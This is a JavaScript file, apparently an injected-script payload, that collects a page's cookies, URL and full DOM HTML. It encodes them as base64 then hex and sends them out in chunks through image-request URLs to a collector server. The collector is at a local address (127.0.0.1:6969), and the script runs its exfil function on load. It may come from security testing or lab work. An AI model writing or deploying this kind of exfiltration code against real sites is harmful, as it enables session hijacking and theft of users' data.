const url = "http://127.0.0.1:6969/"

//Stack Overflow: https://stackoverflow.com/a/57391629
function bytesToHex(bytes) {
  return Array.from(
    bytes,
    byte => byte.toString(16).padStart(2, "0")
  ).join("");
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// You almost certainly want UTF-8, which is
// now natively supported:
function stringToUTF8Bytes(string) {
  return new TextEncoder().encode(string);
}

// But you might want UTF-16 for some reason.
// .charCodeAt(index) will return the underlying
// UTF-16 code-units (not code-points!), so you
// just need to format them in whichever endian order you want.
function stringToUTF16Bytes(string, littleEndian) {
  const bytes = new Uint8Array(string.length * 2);
  // Using DataView is the only way to get a specific
  // endianness.
  const view = new DataView(bytes.buffer);
  for (let i = 0; i != string.length; i++) {
    view.setUint16(i, string.charCodeAt(i), littleEndian);
  }
  return bytes;
}

// And you might want UTF-32 in even weirder cases.
// Fortunately, iterating a string gives the code
// points, which are identical to the UTF-32 encoding,
// though you still have the endianess issue.
function stringToUTF32Bytes(string, littleEndian) {
  const codepoints = Array.from(string, c => c.codePointAt(0));
  const bytes = new Uint8Array(codepoints.length * 4);
  // Using DataView is the only way to get a specific
  // endianness.
  const view = new DataView(bytes.buffer);
  for (let i = 0; i != codepoints.length; i++) {
    view.setUint32(i, codepoints[i], littleEndian);
  }
  return bytes;
}

function send_data(endpoint,data)
{
  let uri = url + endpoint;
  const xhr = new XMLHttpRequest();
  xhr.open('GET', uri);
  xhr.send(data);
  xhr.onload = () => {
    console.log(xhr.responseText);
  }
}

function encode(payload){
    let b64enc = btoa(payload);
    const hex_enc = bytesToHex(stringToUTF8Bytes(b64enc));
    return hex_enc;
}



function exfil() {
  var payload = encode("Cookie:\n"+document.cookie+"\nURL: \n"+document.url+"\nDOM HTML:\n"+document.documentElement.innerHTML);
  var chunksize = 200 - document.documentURI.length - 1; // https://www.geeksforgeeks.org/maximum-length-of-a-url-in-different-browsers/
  var numberOfChunks = Math.floor(payload.length / chunksize);
  var remainder = payload.slice(-(payload.length % chunksize));
  console.log("Payload: "+payload);
  console.log("Chunk Size: "+chunksize);
  console.log("Number of Chunks: "+numberOfChunks);
  console.log("Remainder: "+remainder);

  var x = document.createElement("img");
  x.src = url + "exfil/init?noc=" + numberOfChunks;
  sleep(100);

  // Exfiltrating Chunks
  for (i = 0 ; i < numberOfChunks; i++)
  {
    console.log("Chunk: "+ (i+1) + " of "+ (numberOfChunks));
    var exfilChunk = payload.slice(chunksize*i, chunksize*(i+1));
    var downloadImage = document.createElement("img");
    downloadImage.src = url+"exfil?num="+i+"&chunk="+exfilChunk;
    sleep(500);
  }

  var x = document.createElement("img")
  x.src = url+"exfil?num="+numberOfChunks+ "&noc="+numberOfChunks+"&chunk="+remainder;
  console.log("Sending Remainder");
}

exfil();